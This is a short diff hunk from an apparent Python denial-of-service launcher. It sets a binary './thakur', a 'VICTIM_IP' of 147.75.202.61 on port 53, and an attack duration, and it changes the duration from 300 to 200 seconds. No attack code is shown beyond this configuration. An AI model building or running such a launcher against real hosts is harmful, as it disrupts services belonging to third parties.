@@ -6,7 +6,7 @@ import sys
 BINARY = "./thakur"
 VICTIM_IP = "147.75.202.61"
 VICTIM_PORT = "53"
-DURATION = "300"
+DURATION = "200"
 
 def setup_limits():
     print("[+] Setting system limits for maximum performance...")
